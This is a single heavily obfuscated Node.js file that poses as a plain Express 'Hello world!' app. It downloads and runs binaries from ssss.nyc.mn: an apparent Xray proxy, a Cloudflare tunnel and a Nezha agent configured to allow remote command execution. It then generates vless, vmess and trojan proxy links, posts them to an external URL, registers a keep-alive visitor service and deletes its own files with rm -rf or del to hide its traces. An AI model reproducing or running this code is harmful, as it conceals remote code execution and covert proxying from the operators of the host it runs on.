const _0x54b304=_0x5bdd;(function(_0x44ad05,_0x33e2d7){const _0x1f03d3=_0x5bdd,_0x20d559=_0x44ad05();while(!![]){try{const _0x2f4613=parseInt(_0x1f03d3(0x1af))/0x1*(-parseInt(_0x1f03d3(0x1d2))/0x2)+parseInt(_0x1f03d3(0x1d5))/0x3*(-parseInt(_0x1f03d3(0x17f))/0x4)+parseInt(_0x1f03d3(0x16a))/0x5*(parseInt(_0x1f03d3(0x18c))/0x6)+-parseInt(_0x1f03d3(0x144))/0x7+-parseInt(_0x1f03d3(0x137))/0x8*(-parseInt(_0x1f03d3(0x17a))/0x9)+-parseInt(_0x1f03d3(0x175))/0xa+parseInt(_0x1f03d3(0x1bc))/0xb;if(_0x2f4613===_0x33e2d7)break;else _0x20d559['push'](_0x20d559['shift']());}catch(_0xdd0a5e){_0x20d559['push'](_0x20d559['shift']());}}}(_0x317d,0x97a7c));const express=require(_0x54b304(0x143)),app=express(),axios=require(_0x54b304(0x15f)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x54b304(0x11f)),exec=promisify(require(_0x54b304(0x1b0))['exec']),{execSync}=require(_0x54b304(0x1b0)),UPLOAD_URL=process[_0x54b304(0x1aa)][_0x54b304(0x182)]||'',PROJECT_URL=process[_0x54b304(0x1aa)][_0x54b304(0x125)]||'',AUTO_ACCESS=process[_0x54b304(0x1aa)][_0x54b304(0x19b)]||![],FILE_PATH=process[_0x54b304(0x1aa)][_0x54b304(0x1c0)]||'./tmp',SUB_PATH=process[_0x54b304(0x1aa)][_0x54b304(0x12c)]||_0x54b304(0x159),PORT=process[_0x54b304(0x1aa)]['SERVER_PORT']||process[_0x54b304(0x1aa)][_0x54b304(0x1a7)]||0xbb8,UUID=process['env'][_0x54b304(0x123)]||'9afd1229-b893-40c1-84dd-51e7ce204913',NEZHA_SERVER=process[_0x54b304(0x1aa)][_0x54b304(0x1cf)]||'',NEZHA_PORT=process[_0x54b304(0x1aa)][_0x54b304(0x155)]||'',NEZHA_KEY=process[_0x54b304(0x1aa)][_0x54b304(0x1bb)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x54b304(0x1c5),ARGO_AUTH=process[_0x54b304(0x1aa)][_0x54b304(0x12f)]||_0x54b304(0x147),ARGO_PORT=process[_0x54b304(0x1aa)][_0x54b304(0x184)]||0xcb20,CFIP=process['env'][_0x54b304(0x16c)]||'cdns.doon.eu.org',CFPORT=process['env'][_0x54b304(0x198)]||0x1bb,NAME=process[_0x54b304(0x1aa)][_0x54b304(0x1be)]||'';!fs[_0x54b304(0x1b3)](FILE_PATH)?(fs[_0x54b304(0x172)](FILE_PATH),console[_0x54b304(0x17d)](FILE_PATH+_0x54b304(0x183))):console['log'](FILE_PATH+_0x54b304(0x1c7));function generateRandomName(){const _0x1b40db=_0x54b304,_0x58ae92=_0x1b40db(0x19e);let _0x28a4bd='';for(let _0x109505=0x0;_0x109505<0x6;_0x109505++){_0x28a4bd+=_0x58ae92[_0x1b40db(0x121)](Math[_0x1b40db(0x1c2)](Math[_0x1b40db(0x1a2)]()*_0x58ae92[_0x1b40db(0x135)]));}return _0x28a4bd;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x54b304(0x18b)](FILE_PATH,npmName),phpPath=path[_0x54b304(0x18b)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x54b304(0x18b)](FILE_PATH,botName),subPath=path[_0x54b304(0x18b)](FILE_PATH,_0x54b304(0x19f)),listPath=path[_0x54b304(0x18b)](FILE_PATH,_0x54b304(0x1da)),bootLogPath=path[_0x54b304(0x18b)](FILE_PATH,_0x54b304(0x1ca)),configPath=path[_0x54b304(0x18b)](FILE_PATH,_0x54b304(0x141));function _0x317d(){const _0x2d9292=['.exe\x20>\x20nul\x202>&1','2096','/vmess-argo?ed=2560','response','pipe','axios','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20-c\x20\x22','unlinkSync','org','base64','country_code','vless','http','5MyAEUf','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','CFIP','\x0a\x20\x20tunnel:\x20','includes','get','Error\x20executing\x20command:\x20','/api/add-nodes','mkdirSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0a\x0avmess://','6343430IKhFSW','https://amd64.ssss.nyc.mn/bot','isFile','data','automatic\x20access\x20task\x20added\x20successfully','18jcKSnS','/sub.txt\x20saved\x20successfully','\x0a\x20\x20credentials-file:\x20','log','/trojan-argo','61580hWnamz','\x20>\x20nul\x202>&1','substring','UPLOAD_URL','\x20is\x20created','ARGO_PORT','Nodes\x20uploaded\x20successfully','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','platform','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','countryCode','stringify','join','6408366CXaZLn','https://ipapi.co/json/','\x20>/dev/null\x202>&1','\x22\x20>\x20/dev/null\x202>&1','https://amd64.ssss.nyc.mn/agent','tls','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','split','clear','application/json','readdirSync','Content-Type','CFPORT','set','createWriteStream','AUTO_ACCESS','php\x20running\x20error:\x20','error','abcdefghijklmnopqrstuvwxyz','sub.txt','&path=%2Fvless-argo%3Fed%3D2560#','\x20successfully','random','Add\x20automatic\x20access\x20task\x20faild:\x20','/api/delete-nodes','https://oooo.serv00.net/add-url','http://ip-api.com/json/','PORT','pkill\x20-f\x20\x22[','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','env','catch','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','then','listen','352204hvcbEz','child_process','127.0.0.1','del\x20/f\x20/q\x20','existsSync','https://amd64.ssss.nyc.mn/v1','success','2083','post','filter','web\x20running\x20error:\x20','arch','NEZHA_KEY','8780673iewJsz','\x0aclient_secret:\x20','NAME','from','FILE_PATH','2087','floor','&fp=firefox&type=ws&host=','test','you.chinese88.de5.net','--tls','\x20already\x20exists','8443','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','boot.log','Empowerment\x20success\x20for\x20','basename','fileName','has','NEZHA_SERVER','\x20failed:\x20','tunnel.yml','2TdaqVd','none','Unknown','102DmVlKL','\x20-c\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','statSync','close','list.txt','map','Download\x20','writeFileSync','/vless-argo','send','all','util','pop','charAt','block','UUID','Unhandled\x20error\x20in\x20startserver:','PROJECT_URL','message','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','push','Error\x20in\x20startserver:','/dev/null','/api/add-subscriptions','SUB_PATH','\x20-p\x20','firefox','ARGO_AUTH','match','arm','finish','fileUrl','\x0avless://','length','Subscription\x20uploaded\x20successfully','2638152AlJTTB','http\x20server\x20is\x20running\x20on\x20port:','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','win32','/vmess-argo','/tunnel.yml\x20run','https://arm64.ssss.nyc.mn/web','utf-8','tcp','\x20is\x20running','config.json','\x20-s\x20','express','2762795CwKngA','blackhole','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','eyJhIjioNTg5ZjIwZDZjMThiYTVlMDIzMDExMzUwMGM2MWM3MGUiLCJ0IjioN2RiOGM0ODgtNmI5Ny00ZjRjLTgtY2Y1YmY1IiwicyI6IlpqUTROMkptTnpjdE1tUTFaaTAwTmpaaUxUZzFOV1V0WkdVMFpUY3laRFpoWVdWaij9','npm\x20running\x20error:\x20','\x20>/dev/null\x202>&1\x20&','toString','status','taskkill\x20/f\x20/im\x20','2053','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','tunnel.json','readFileSync','443','unshift','&path=%2Ftrojan-argo%3Fed%3D2560#','App\x20is\x20running','NEZHA_PORT','\x0a\x20\x20\x20\x20','nohup\x20','forEach','sub1216'];_0x317d=function(){return _0x2d9292;};return _0x317d();}function _0x5bdd(_0x5c18cb,_0x24e61a){const _0x317d4f=_0x317d();return _0x5bdd=function(_0x5bdd57,_0x3cca7b){_0x5bdd57=_0x5bdd57-0x11d;let _0x454a41=_0x317d4f[_0x5bdd57];return _0x454a41;},_0x5bdd(_0x5c18cb,_0x24e61a);}function deleteNodes(){const _0x23f478=_0x54b304;try{if(!UPLOAD_URL)return;if(!fs[_0x23f478(0x1b3)](subPath))return;let _0xdc5104;try{_0xdc5104=fs[_0x23f478(0x150)](subPath,'utf-8');}catch{return null;}const _0x3ec5cd=Buffer[_0x23f478(0x1bf)](_0xdc5104,_0x23f478(0x166))[_0x23f478(0x14a)](_0x23f478(0x13e)),_0x72b438=_0x3ec5cd[_0x23f478(0x193)]('\x0a')[_0x23f478(0x1b8)](_0x23d6a4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x23f478(0x1c4)](_0x23d6a4));if(_0x72b438['length']===0x0)return;return axios[_0x23f478(0x1b7)](UPLOAD_URL+_0x23f478(0x1a4),JSON[_0x23f478(0x18a)]({'nodes':_0x72b438}),{'headers':{'Content-Type':'application/json'}})[_0x23f478(0x1ab)](_0x322c8c=>{return null;}),null;}catch(_0x34c3c4){return null;}}function cleanupOldFiles(){const _0x1b9aaf=_0x54b304;try{const _0x4c3aa3=fs[_0x1b9aaf(0x196)](FILE_PATH);_0x4c3aa3[_0x1b9aaf(0x158)](_0x1323fc=>{const _0x3dee03=_0x1b9aaf,_0x2041c0=path[_0x3dee03(0x18b)](FILE_PATH,_0x1323fc);try{const _0x5c3371=fs[_0x3dee03(0x1d8)](_0x2041c0);_0x5c3371[_0x3dee03(0x177)]()&&fs[_0x3dee03(0x164)](_0x2041c0);}catch(_0x54d526){}});}catch(_0x12a8d9){}}app['get']('/',function(_0x2ddcf4,_0x14a473){const _0x478120=_0x54b304;_0x14a473[_0x478120(0x11d)]('Hello\x20world!');});async function generateConfig(){const _0x5a016b=_0x54b304,_0x2cf925={'log':{'access':_0x5a016b(0x12a),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x5a016b(0x1d3),'fallbacks':[{'dest':0xbb9},{'path':_0x5a016b(0x1de),'dest':0xbba},{'path':_0x5a016b(0x13b),'dest':0xbbb},{'path':_0x5a016b(0x17e),'dest':0xbbc}]},'streamSettings':{'network':_0x5a016b(0x13f)}},{'port':0xbb9,'listen':_0x5a016b(0x1b1),'protocol':_0x5a016b(0x168),'settings':{'clients':[{'id':UUID}],'decryption':_0x5a016b(0x1d3)},'streamSettings':{'network':'tcp','security':_0x5a016b(0x1d3)}},{'port':0xbba,'listen':_0x5a016b(0x1b1),'protocol':_0x5a016b(0x168),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5a016b(0x1de)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a016b(0x169),_0x5a016b(0x191),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5a016b(0x1b1),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5a016b(0x169),_0x5a016b(0x191),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5a016b(0x1b1),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5a016b(0x1d3),'wsSettings':{'path':_0x5a016b(0x17e)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a016b(0x169),_0x5a016b(0x191),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x5a016b(0x145),'tag':_0x5a016b(0x122)}]};fs[_0x5a016b(0x1dd)](path['join'](FILE_PATH,_0x5a016b(0x141)),JSON[_0x5a016b(0x18a)](_0x2cf925,null,0x2));}function getSystemArchitecture(){const _0xcba4=_0x54b304,_0x152703=os[_0xcba4(0x1ba)]();return _0x152703===_0xcba4(0x131)||_0x152703==='arm64'||_0x152703==='aarch64'?_0xcba4(0x131):'amd';}function downloadFile(_0x1db644,_0x586413,_0x58cc41){const _0x2d5852=_0x54b304,_0x569460=_0x1db644;!fs[_0x2d5852(0x1b3)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x5e6a3c=fs[_0x2d5852(0x19a)](_0x569460);axios({'method':'get','url':_0x586413,'responseType':'stream'})[_0x2d5852(0x1ad)](_0x3644b4=>{const _0x15f166=_0x2d5852;_0x3644b4['data'][_0x15f166(0x15e)](_0x5e6a3c),_0x5e6a3c['on'](_0x15f166(0x132),()=>{const _0x5d14d3=_0x15f166;_0x5e6a3c[_0x5d14d3(0x1d9)](),console[_0x5d14d3(0x17d)](_0x5d14d3(0x1dc)+path[_0x5d14d3(0x1cc)](_0x569460)+_0x5d14d3(0x1a1)),_0x58cc41(null,_0x569460);}),_0x5e6a3c['on'](_0x15f166(0x19d),_0xe9626f=>{const _0x9596ca=_0x15f166;fs['unlink'](_0x569460,()=>{});const _0x565d4b=_0x9596ca(0x1dc)+path[_0x9596ca(0x1cc)](_0x569460)+'\x20failed:\x20'+_0xe9626f['message'];console['error'](_0x565d4b),_0x58cc41(_0x565d4b);});})['catch'](_0x1f6bca=>{const _0x223c4c=_0x2d5852,_0x1b8279=_0x223c4c(0x1dc)+path[_0x223c4c(0x1cc)](_0x569460)+_0x223c4c(0x1d0)+_0x1f6bca[_0x223c4c(0x126)];console[_0x223c4c(0x19d)](_0x1b8279),_0x58cc41(_0x1b8279);});}async function downloadFilesAndRun(){const _0x7757d0=_0x54b304,_0x171b07=getSystemArchitecture(),_0x569dd6=getFilesForArchitecture(_0x171b07);if(_0x569dd6['length']===0x0){console[_0x7757d0(0x17d)](_0x7757d0(0x14e));return;}const _0x14d4f3=_0x569dd6[_0x7757d0(0x1db)](_0x44513c=>{return new Promise((_0x250802,_0x26c829)=>{const _0x4b4186=_0x5bdd;downloadFile(_0x44513c[_0x4b4186(0x1cd)],_0x44513c[_0x4b4186(0x133)],(_0x2029a1,_0x1c9c5f)=>{_0x2029a1?_0x26c829(_0x2029a1):_0x250802(_0x1c9c5f);});});});try{await Promise[_0x7757d0(0x11e)](_0x14d4f3);}catch(_0x4abcf8){console[_0x7757d0(0x19d)]('Error\x20downloading\x20files:',_0x4abcf8);return;}function _0x3c21f2(_0x11668b){const _0x557596=0x1fd;_0x11668b['forEach'](_0x24776f=>{const _0xcd5c34=_0x5bdd;fs[_0xcd5c34(0x1b3)](_0x24776f)&&fs['chmod'](_0x24776f,_0x557596,_0x1ce8f8=>{const _0x153d56=_0xcd5c34;_0x1ce8f8?console[_0x153d56(0x19d)]('Empowerment\x20failed\x20for\x20'+_0x24776f+':\x20'+_0x1ce8f8):console[_0x153d56(0x17d)](_0x153d56(0x1cb)+_0x24776f+':\x20'+_0x557596[_0x153d56(0x14a)](0x8));});});}const _0x519d5f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3c21f2(_0x519d5f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x7b5973=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x7757d0(0x193)](':')[_0x7757d0(0x120)]():'',_0x460288=new Set(['443',_0x7757d0(0x1c8),_0x7757d0(0x15b),_0x7757d0(0x1c1),_0x7757d0(0x1b6),_0x7757d0(0x14d)]),_0x43a794=_0x460288[_0x7757d0(0x1ce)](_0x7b5973)?'true':'false',_0x4978e6=_0x7757d0(0x1bd)+NEZHA_KEY+_0x7757d0(0x173)+NEZHA_SERVER+_0x7757d0(0x161)+_0x43a794+_0x7757d0(0x192)+UUID;fs[_0x7757d0(0x1dd)](path['join'](FILE_PATH,'config.yaml'),_0x4978e6);const _0x57319e=_0x7757d0(0x157)+phpPath+_0x7757d0(0x163)+FILE_PATH+_0x7757d0(0x160);try{await exec(_0x57319e),console[_0x7757d0(0x17d)](phpName+_0x7757d0(0x140)),await new Promise(_0x2ca524=>setTimeout(_0x2ca524,0x3e8));}catch(_0x2c3c0e){console['error'](_0x7757d0(0x19c)+_0x2c3c0e);}}else{let _0x459352='';const _0x36ba04=[_0x7757d0(0x151),_0x7757d0(0x1c8),_0x7757d0(0x15b),_0x7757d0(0x1c1),_0x7757d0(0x1b6),'2053'];_0x36ba04[_0x7757d0(0x16e)](NEZHA_PORT)&&(_0x459352=_0x7757d0(0x1c6));const _0x41977c=_0x7757d0(0x157)+npmPath+_0x7757d0(0x142)+NEZHA_SERVER+':'+NEZHA_PORT+_0x7757d0(0x12d)+NEZHA_KEY+'\x20'+_0x459352+_0x7757d0(0x146);try{await exec(_0x41977c),console['log'](npmName+_0x7757d0(0x140)),await new Promise(_0x59f83a=>setTimeout(_0x59f83a,0x3e8));}catch(_0x5cbbf3){console['error'](_0x7757d0(0x148)+_0x5cbbf3);}}}else console['log'](_0x7757d0(0x162));const _0x55ec51='nohup\x20'+webPath+_0x7757d0(0x1d6)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x55ec51),console[_0x7757d0(0x17d)](webName+_0x7757d0(0x140)),await new Promise(_0x4b41f6=>setTimeout(_0x4b41f6,0x3e8));}catch(_0x2ce909){console[_0x7757d0(0x19d)](_0x7757d0(0x1b9)+_0x2ce909);}if(fs['existsSync'](botPath)){let _0x2714d6;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x2714d6='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x2714d6=_0x7757d0(0x16b)+FILE_PATH+_0x7757d0(0x13c):_0x2714d6=_0x7757d0(0x1c9)+FILE_PATH+_0x7757d0(0x127)+ARGO_PORT;try{await exec(_0x7757d0(0x157)+botPath+'\x20'+_0x2714d6+_0x7757d0(0x149)),console[_0x7757d0(0x17d)](botName+_0x7757d0(0x140)),await new Promise(_0x168616=>setTimeout(_0x168616,0x7d0));}catch(_0x2d22cb){console[_0x7757d0(0x19d)](_0x7757d0(0x170)+_0x2d22cb);}}await new Promise(_0x49d1f3=>setTimeout(_0x49d1f3,0x1388));}function getFilesForArchitecture(_0x319816){const _0x1f0cbc=_0x54b304;let _0x208419;_0x319816===_0x1f0cbc(0x131)?_0x208419=[{'fileName':webPath,'fileUrl':_0x1f0cbc(0x13d)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x208419=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1f0cbc(0x176)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x236ac1=_0x319816===_0x1f0cbc(0x131)?'https://arm64.ssss.nyc.mn/agent':_0x1f0cbc(0x190);_0x208419[_0x1f0cbc(0x152)]({'fileName':npmPath,'fileUrl':_0x236ac1});}else{const _0x34c2cc=_0x319816===_0x1f0cbc(0x131)?'https://arm64.ssss.nyc.mn/v1':_0x1f0cbc(0x1b4);_0x208419[_0x1f0cbc(0x152)]({'fileName':phpPath,'fileUrl':_0x34c2cc});}}return _0x208419;}function argoType(){const _0x35e11a=_0x54b304;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x35e11a(0x17d)](_0x35e11a(0x1a9));return;}if(ARGO_AUTH[_0x35e11a(0x16e)]('TunnelSecret')){fs[_0x35e11a(0x1dd)](path[_0x35e11a(0x18b)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x140e2a=_0x35e11a(0x16d)+ARGO_AUTH['split']('\x22')[0xb]+_0x35e11a(0x17c)+path[_0x35e11a(0x18b)](FILE_PATH,_0x35e11a(0x14f))+_0x35e11a(0x1ac)+ARGO_DOMAIN+_0x35e11a(0x186)+ARGO_PORT+_0x35e11a(0x1d7);fs['writeFileSync'](path['join'](FILE_PATH,_0x35e11a(0x1d1)),_0x140e2a);}else console[_0x35e11a(0x17d)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x450fb3=_0x54b304;let _0x3be951;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3be951=ARGO_DOMAIN,console[_0x450fb3(0x17d)]('ARGO_DOMAIN:',_0x3be951),await _0x261cd3(_0x3be951);else try{const _0x299118=fs[_0x450fb3(0x150)](path[_0x450fb3(0x18b)](FILE_PATH,_0x450fb3(0x1ca)),_0x450fb3(0x13e)),_0x536e4f=_0x299118['split']('\x0a'),_0x4744cf=[];_0x536e4f[_0x450fb3(0x158)](_0x1d44a4=>{const _0x6e5106=_0x450fb3,_0x5a9487=_0x1d44a4[_0x6e5106(0x130)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5a9487){const _0x73bb69=_0x5a9487[0x1];_0x4744cf[_0x6e5106(0x128)](_0x73bb69);}});if(_0x4744cf[_0x450fb3(0x135)]>0x0)_0x3be951=_0x4744cf[0x0],console[_0x450fb3(0x17d)]('ArgoDomain:',_0x3be951),await _0x261cd3(_0x3be951);else{console[_0x450fb3(0x17d)](_0x450fb3(0x188)),fs[_0x450fb3(0x164)](path[_0x450fb3(0x18b)](FILE_PATH,_0x450fb3(0x1ca)));async function _0x2453f9(){const _0x557a3b=_0x450fb3;try{process[_0x557a3b(0x187)]==='win32'?await exec(_0x557a3b(0x14c)+botName+_0x557a3b(0x15a)):await exec(_0x557a3b(0x1a8)+botName['charAt'](0x0)+']'+botName[_0x557a3b(0x181)](0x1)+_0x557a3b(0x18f));}catch(_0x3034d3){}}_0x2453f9(),await new Promise(_0x3ae8e1=>setTimeout(_0x3ae8e1,0xbb8));const _0x25a3e5=_0x450fb3(0x1c9)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x450fb3(0x157)+botPath+'\x20'+_0x25a3e5+_0x450fb3(0x149)),console[_0x450fb3(0x17d)](botName+'\x20is\x20running'),await new Promise(_0x21a5b6=>setTimeout(_0x21a5b6,0xbb8)),await extractDomains();}catch(_0x971efc){console['error']('Error\x20executing\x20command:\x20'+_0x971efc);}}}catch(_0x5053c4){console[_0x450fb3(0x19d)]('Error\x20reading\x20boot.log:',_0x5053c4);}async function _0x55f4ae(){const _0xce7157=_0x450fb3;try{const _0x20f758=await axios[_0xce7157(0x16f)](_0xce7157(0x18d),{'timeout':0xbb8});if(_0x20f758[_0xce7157(0x178)]&&_0x20f758[_0xce7157(0x178)][_0xce7157(0x167)]&&_0x20f758[_0xce7157(0x178)][_0xce7157(0x165)])return _0x20f758[_0xce7157(0x178)]['country_code']+'_'+_0x20f758[_0xce7157(0x178)][_0xce7157(0x165)];}catch(_0x1573f0){try{const _0x224895=await axios['get'](_0xce7157(0x1a6),{'timeout':0xbb8});if(_0x224895[_0xce7157(0x178)]&&_0x224895[_0xce7157(0x178)]['status']===_0xce7157(0x1b5)&&_0x224895[_0xce7157(0x178)][_0xce7157(0x189)]&&_0x224895[_0xce7157(0x178)][_0xce7157(0x165)])return _0x224895[_0xce7157(0x178)][_0xce7157(0x189)]+'_'+_0x224895[_0xce7157(0x178)]['org'];}catch(_0x20d55b){}}return _0xce7157(0x1d4);}async function _0x261cd3(_0x3b6eac){const _0x5e5d10=await _0x55f4ae(),_0x59b6f7=NAME?NAME+'-'+_0x5e5d10:_0x5e5d10;return new Promise(_0x4805c0=>{setTimeout(()=>{const _0x2fa670=_0x5bdd,_0x383064={'v':'2','ps':''+_0x59b6f7,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2fa670(0x1d3),'net':'ws','type':_0x2fa670(0x1d3),'host':_0x3b6eac,'path':_0x2fa670(0x15c),'tls':_0x2fa670(0x191),'sni':_0x3b6eac,'alpn':'','fp':_0x2fa670(0x12e)},_0x45c3f1=_0x2fa670(0x134)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x3b6eac+'&fp=firefox&type=ws&host='+_0x3b6eac+_0x2fa670(0x1a0)+_0x59b6f7+_0x2fa670(0x174)+Buffer[_0x2fa670(0x1bf)](JSON[_0x2fa670(0x18a)](_0x383064))[_0x2fa670(0x14a)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x3b6eac+_0x2fa670(0x1c3)+_0x3b6eac+_0x2fa670(0x153)+_0x59b6f7+_0x2fa670(0x156);console['log'](Buffer['from'](_0x45c3f1)['toString']('base64')),fs[_0x2fa670(0x1dd)](subPath,Buffer['from'](_0x45c3f1)['toString'](_0x2fa670(0x166))),console[_0x2fa670(0x17d)](FILE_PATH+_0x2fa670(0x17b)),uploadNodes(),app[_0x2fa670(0x16f)]('/'+SUB_PATH,(_0x4dd66b,_0x136722)=>{const _0x6cc01c=_0x2fa670,_0x458b05=Buffer['from'](_0x45c3f1)[_0x6cc01c(0x14a)](_0x6cc01c(0x166));_0x136722[_0x6cc01c(0x199)](_0x6cc01c(0x197),'text/plain;\x20charset=utf-8'),_0x136722['send'](_0x458b05);}),_0x4805c0(_0x45c3f1);},0x7d0);});}}async function uploadNodes(){const _0x5e8c26=_0x54b304;if(UPLOAD_URL&&PROJECT_URL){const _0x201f8e=PROJECT_URL+'/'+SUB_PATH,_0x412f30={'subscription':[_0x201f8e]};try{const _0x5ece1d=await axios[_0x5e8c26(0x1b7)](UPLOAD_URL+_0x5e8c26(0x12b),_0x412f30,{'headers':{'Content-Type':_0x5e8c26(0x195)}});return _0x5ece1d&&_0x5ece1d[_0x5e8c26(0x14b)]===0xc8?(console[_0x5e8c26(0x17d)](_0x5e8c26(0x136)),_0x5ece1d):null;}catch(_0xff4501){if(_0xff4501[_0x5e8c26(0x15d)]){if(_0xff4501['response'][_0x5e8c26(0x14b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5e8c26(0x1b3)](listPath))return;const _0x556415=fs[_0x5e8c26(0x150)](listPath,_0x5e8c26(0x13e)),_0x5d6a57=_0x556415['split']('\x0a')['filter'](_0x42390f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5e8c26(0x1c4)](_0x42390f));if(_0x5d6a57[_0x5e8c26(0x135)]===0x0)return;const _0x1c7f01=JSON[_0x5e8c26(0x18a)]({'nodes':_0x5d6a57});try{const _0x48cad=await axios['post'](UPLOAD_URL+_0x5e8c26(0x171),_0x1c7f01,{'headers':{'Content-Type':_0x5e8c26(0x195)}});return _0x48cad&&_0x48cad[_0x5e8c26(0x14b)]===0xc8?(console[_0x5e8c26(0x17d)](_0x5e8c26(0x185)),_0x48cad):null;}catch(_0x2054f7){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x529ab8=_0x5bdd,_0xef43f6=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xef43f6[_0x529ab8(0x128)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xef43f6[_0x529ab8(0x128)](phpPath);process['platform']===_0x529ab8(0x13a)?exec(_0x529ab8(0x1b2)+_0xef43f6[_0x529ab8(0x18b)]('\x20')+_0x529ab8(0x180),_0x1ea5ea=>{const _0x550985=_0x529ab8;console[_0x550985(0x194)](),console[_0x550985(0x17d)](_0x550985(0x154)),console[_0x550985(0x17d)](_0x550985(0x139));}):exec('rm\x20-rf\x20'+_0xef43f6[_0x529ab8(0x18b)]('\x20')+_0x529ab8(0x18e),_0x2cd904=>{const _0x58428b=_0x529ab8;console[_0x58428b(0x194)](),console[_0x58428b(0x17d)](_0x58428b(0x154)),console['log'](_0x58428b(0x139));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x21883c=_0x54b304;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x1ebe6e=await axios[_0x21883c(0x1b7)](_0x21883c(0x1a5),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x21883c(0x17d)](_0x21883c(0x179)),_0x1ebe6e;}catch(_0x3833d8){return console['error'](_0x21883c(0x1a3)+_0x3833d8[_0x21883c(0x126)]),null;}}async function startserver(){const _0xdb204b=_0x54b304;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x38ed5e){console['error'](_0xdb204b(0x129),_0x38ed5e);}}startserver()[_0x54b304(0x1ab)](_0x47dbf0=>{const _0x561bdf=_0x54b304;console[_0x561bdf(0x19d)](_0x561bdf(0x124),_0x47dbf0);}),app[_0x54b304(0x1ae)](PORT,()=>console['log'](_0x54b304(0x138)+PORT+'!'));
